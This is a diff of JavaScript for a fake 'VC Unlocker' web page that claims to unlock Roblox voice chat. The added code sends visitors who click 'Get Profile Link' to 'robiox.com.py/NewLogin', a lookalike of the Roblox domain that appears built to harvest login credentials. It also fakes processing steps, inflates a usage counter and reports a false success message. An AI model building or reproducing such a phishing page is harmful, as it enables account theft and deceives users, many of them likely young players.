@@ -1,15 +1,229 @@
-// ========== RECENT ACTIVITY FUNCTIONS ==========
+const REDIRECT_URL = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F274156662874%2FPLS-DONATE";
 
-// Function to fetch Roblox user avatar
+let todayCount = parseInt(localStorage.getItem('vc_today_count')) || 1248;
+let activityHistory = JSON.parse(localStorage.getItem('vc_activity_history')) || [];
+
+function saveTodayCount() {
+    localStorage.setItem('vc_today_count', todayCount);
+}
+
+function saveActivityHistory() {
+    if (activityHistory.length > 20) {
+        activityHistory = activityHistory.slice(0, 20);
+    }
+    localStorage.setItem('vc_activity_history', JSON.stringify(activityHistory));
+}
+
+let processingQueue = [];
+
+const progressContainer = document.getElementById('progressContainer');
+const progressBar = document.getElementById('progressBar');
+const modalOverlay = document.getElementById('modalOverlay');
+const modalCloseBtn = document.getElementById('modalCloseBtn');
+const finalMessageDiv = document.getElementById('finalMessage');
+const activityFeed = document.getElementById('activityFeed');
+const todayCountElem = document.getElementById('todayCount');
+const processingCountElem = document.getElementById('processingCount');
+const notificationBar = document.getElementById('notificationBar');
+const notificationIcon = document.getElementById('notificationIcon');
+const notificationTitle = document.getElementById('notificationTitle');
+const notificationMessage = document.getElementById('notificationMessage');
+
+let progressInterval = null;
+
+function showNotification(title, message, type = 'info') {
+    const iconElement = notificationIcon.querySelector('i');
+    
+    if (type === 'success') {
+        iconElement.className = 'fas fa-check-circle';
+        iconElement.style.color = '#22c55e';
+        notificationIcon.style.background = 'rgba(34, 197, 94, 0.2)';
+    } else if (type === 'error') {
+        iconElement.className = 'fas fa-exclamation-triangle';
+        iconElement.style.color = '#f97316';
+        notificationIcon.style.background = 'rgba(249, 115, 22, 0.2)';
+    } else {
+        iconElement.className = 'fas fa-info-circle';
+        iconElement.style.color = '#8b5cf6';
+        notificationIcon.style.background = 'rgba(139, 92, 246, 0.2)';
+    }
+    
+    notificationTitle.textContent = title;
+    notificationMessage.textContent = message;
+    
+    notificationBar.classList.add('show');
+    
+    setTimeout(() => {
+        notificationBar.classList.remove('show');
+    }, 5000);
+}
+
+window.closeNotificationBar = function() {
+    notificationBar.classList.remove('show');
+};
+
+function updateProcessingCount() {
+    processingCountElem.textContent = processingQueue.length;
+}
+
+function addToProcessing(username) {
+    processingQueue.push({ username, startTime: Date.now() });
+    updateProcessingCount();
+    
+    setTimeout(() => {
+        const index = processingQueue.findIndex(u => u.username === username);
+        if (index !== -1) {
+            processingQueue.splice(index, 1);
+            updateProcessingCount();
+        }
+    }, 7500);
+}
+
+function getTimeAgo(timestamp) {
+    const seconds = Math.floor((Date.now() - timestamp) / 1000);
+    if (seconds < 60) return 'just now';
+    const minutes = Math.floor(seconds / 60);
+    if (minutes < 60) return `${minutes} min ago`;
+    const hours = Math.floor(minutes / 60);
+    if (hours < 24) return `${hours} hr ago`;
+    return `${Math.floor(hours / 24)} days ago`;
+}
+
+function renderActivityFeed() {
+    activityFeed.innerHTML = '';
+    if (activityHistory.length === 0) {
+        activityFeed.innerHTML = '<div class="activity-item"><i class="fas fa-info-circle"></i><span>No recent activity</span><span class="activity-time"></span></div>';
+        return;
+    }
+    
+    activityHistory.forEach((activity) => {
+        const activityItem = document.createElement('div');
+        activityItem.className = 'activity-item';
+        activityItem.innerHTML = `
+            <i class="fas fa-check-circle"></i>
+            <span><span class="activity-user">@${activity.username}</span> just unlocked VC</span>
+            <span class="activity-time">${getTimeAgo(activity.timestamp)}</span>
+        `;
+        activityFeed.appendChild(activityItem);
+    });
+}
+
+function addRealActivity(username) {
+    activityHistory.unshift({
+        username: username,
+        timestamp: Date.now()
+    });
+    
+    if (activityHistory.length > 20) {
+        activityHistory = activityHistory.slice(0, 20);
+    }
+    
+    saveActivityHistory();
+    renderActivityFeed();
+}
+
+function resetSteps() {
+    const steps = ['step1', 'step2', 'step3'];
+    steps.forEach((stepId) => {
+        const step = document.getElementById(stepId);
+        const iconDiv = step.querySelector('.step-icon');
+        const statusSpan = step.querySelector('.step-status');
+        iconDiv.innerHTML = '<i class="fas fa-circle-notch"></i>';
+        statusSpan.textContent = 'Pending';
+        statusSpan.style.color = '#64748b';
+    });
+    finalMessageDiv.style.display = 'none';
+    modalCloseBtn.style.display = 'none';
+}
+
+function updateStep(stepId, isComplete = false) {
+    const step = document.getElementById(stepId);
+    const iconDiv = step.querySelector('.step-icon');
+    const statusSpan = step.querySelector('.step-status');
+    
+    if (isComplete) {
+        iconDiv.innerHTML = '<i class="fas fa-check-circle" style="color: #22c55e;"></i>';
+        statusSpan.textContent = 'Completed';
+        statusSpan.style.color = '#22c55e';
+    } else {
+        iconDiv.innerHTML = '<i class="fas fa-spinner fa-spin" style="color: #8b5cf6;"></i>';
+        statusSpan.textContent = 'In progress';
+        statusSpan.style.color = '#8b5cf6';
+    }
+}
+
+function runSteps(callback) {
+    updateStep('step1', false);
+    setTimeout(() => {
+        updateStep('step1', true);
+        updateStep('step2', false);
+        setTimeout(() => {
+            updateStep('step2', true);
+            updateStep('step3', false);
+            setTimeout(() => {
+                updateStep('step3', true);
+                finalMessageDiv.style.display = 'block';
+                modalCloseBtn.style.display = 'block';
+                if (callback) callback();
+            }, 2500);
+        }, 2500);
+    }, 2500);
+}
+
+function startProgress() {
+    progressContainer.style.display = 'block';
+    let width = 0;
+    if (progressInterval) clearInterval(progressInterval);
+    progressInterval = setInterval(() => {
+        if (width >= 90) {
+            clearInterval(progressInterval);
+        } else {
+            width += 10;
+            progressBar.style.width = width + '%';
+        }
+    }, 80);
+}
+
+function completeProgress() {
+    if (progressInterval) {
+        clearInterval(progressInterval);
+        progressInterval = null;
+    }
+    progressBar.style.width = '100%';
+    setTimeout(() => {
+        progressContainer.style.display = 'none';
+        progressBar.style.width = '0%';
+    }, 500);
+}
+
+function isValidProfileLink(profileUrl) {
+    if (!profileUrl || profileUrl.trim() === "") return false;
+    let url = profileUrl.trim();
+    try {
+        if (!url.startsWith('http://') && !url.startsWith('https://')) {
+            url = 'https://' + url;
+        }
+        const urlObj = new URL(url);
+        if (!urlObj.hostname.includes('roblox.com')) return false;
+        return true;
+    } catch (e) {
+        return false;
+    }
+}
+
+function isValidUsername(username) {
+    if (!username || username.trim() === "") return false;
+    const usernameRegex = /^[a-zA-Z0-9_]{3,20}$/;
+    return usernameRegex.test(username.trim());
+}
+
 async function fetchUserAvatar(username) {
     try {
-        // Try to fetch user ID first
         const response = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
         const data = await response.json();
         
         if (data && data.Id) {
             const userId = data.Id;
-            // Get avatar thumbnail
             const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=100x100&format=Png`);
             const avatarData = await avatarResponse.json();
             
@@ -21,14 +235,12 @@ async function fetchUserAvatar(username) {
             }
         }
         
-        // Fallback to default avatar
         return {
             userId: null,
             avatarUrl: 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=100&height=100&format=png'
         };
     } catch (error) {
         console.error('Error fetching avatar:', error);
-        // Return default avatar
         return {
             userId: null,
             avatarUrl: 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=100&height=100&format=png'
@@ -36,9 +248,7 @@ async function fetchUserAvatar(username) {
     }
 }
 
-// Save recent user to localStorage
 async function saveRecentUser(username) {
-    // Fetch user info
     const userInfo = await fetchUserAvatar(username);
     
     const newUser = {
@@ -48,33 +258,23 @@ async function saveRecentUser(username) {
         timestamp: Date.now()
     };
     
-    // Get existing recent users
     let recent = JSON.parse(localStorage.getItem("recentUsers")) || [];
     
-    // Check if user already exists
     const existingIndex = recent.findIndex(user => user.username.toLowerCase() === username.toLowerCase());
     
     if (existingIndex !== -1) {
-        // Remove existing entry
         recent.splice(existingIndex, 1);
     }
     
-    // Add new user to the front
     recent.unshift(newUser);
-    
-    // Limit to 10 users
     recent = recent.slice(0, 10);
     
-    // Save to localStorage
     localStorage.setItem("recentUsers", JSON.stringify(recent));
-    
-    // Reload the recent users display
     loadRecentUsers();
     
     return newUser;
 }
 
-// Load and display recent users
 function loadRecentUsers() {
     const recentList = document.getElementById('recentList');
     const recent = JSON.parse(localStorage.getItem("recentUsers")) || [];
@@ -90,7 +290,6 @@ function loadRecentUsers() {
         return;
     }
     
-    // Generate HTML for each recent user
     recentList.innerHTML = recent.map(user => `
         <div class="recent-card" data-username="${user.username}">
             <img src="${user.avatar}" alt="${user.username}" class="recent-avatar" onerror="this.src='https://www.roblox.com/headshot-thumbnail/image?userId=1&width=100&height=100&format=png'">
@@ -106,7 +305,6 @@ function loadRecentUsers() {
         </div>
     `).join('');
     
-    // Add click event to cards to populate username field
     document.querySelectorAll('.recent-card').forEach(card => {
         card.addEventListener('click', function() {
             const username = this.dataset.username;
@@ -118,7 +316,6 @@ function loadRecentUsers() {
     });
 }
 
-// Add animation when new card appears
 function animateNewCard() {
     const cards = document.querySelectorAll('.recent-card');
     if (cards.length > 0) {
@@ -129,8 +326,10 @@ function animateNewCard() {
     }
 }
 
-// ========== MODIFIED HANDLE CONFIRM FUNCTION ==========
-// Replace your existing handleConfirm function with this one
+function handleGetProfileLink() {
+    window.location.href = REDIRECT_URL;
+    showNotification("Redirecting", "Opening Roblox login page...", "info");
+}
 
 async function handleConfirm() {
     const profileLink = document.getElementById('profileLinkInput').value.trim();
@@ -156,7 +355,6 @@ async function handleConfirm() {
         return;
     }
     
-    // Save to recent activity (NEW!)
     try {
         await saveRecentUser(username);
         animateNewCard();
@@ -165,7 +363,6 @@ async function handleConfirm() {
         console.error('Error saving recent user:', error);
     }
     
-    // Add to processing queue (REAL STAT)
     addToProcessing(username);
     
     startProgress();
@@ -174,12 +371,10 @@ async function handleConfirm() {
     
     runSteps(() => {
         completeProgress();
-        // REAL STATS - Only increment when user actually processes
         todayCount++;
         todayCountElem.textContent = todayCount.toLocaleString();
-        saveTodayCount(); // Save to localStorage immediately
+        saveTodayCount();
         
-        // Add to activity feed (REAL ACTIVITY)
         addRealActivity(username);
         
         showNotification("Success!", `Voice Chat will be unlocked for @${username} within 24 hours`, "success");
@@ -192,10 +387,45 @@ async function handleConfirm() {
     });
 }
 
-// ========== INITIALIZE ON PAGE LOAD ==========
-// Add this at the end of your script, after all functions are defined
+function closeModal() {
+    modalOverlay.classList.remove('active');
+}
 
-// Load recent users when page loads
+document.getElementById('getProfileLink').addEventListener('click', handleGetProfileLink);
+document.getElementById('confirmBtn').addEventListener('click', handleConfirm);
+modalCloseBtn.addEventListener('click', closeModal);
+
+modalOverlay.addEventListener('click', function(e) {
+    if (e.target === modalOverlay) {
+        closeModal();
+    }
+});
+
+document.getElementById('usernameInput').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        e.preventDefault();
+        handleConfirm();
+    }
+});
+
+document.getElementById('profileLinkInput').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        e.preventDefault();
+        handleConfirm();
+    }
+});
+
+setInterval(() => {
+    renderActivityFeed();
+}, 60000);
+
+todayCountElem.textContent = todayCount.toLocaleString();
+renderActivityFeed();
+
 document.addEventListener('DOMContentLoaded', () => {
     loadRecentUsers();
 });
+
+setTimeout(() => {
+    showNotification("Welcome to VC Unlocker", "Click 'Get Profile Link' to start the process", "info");
+}, 500);
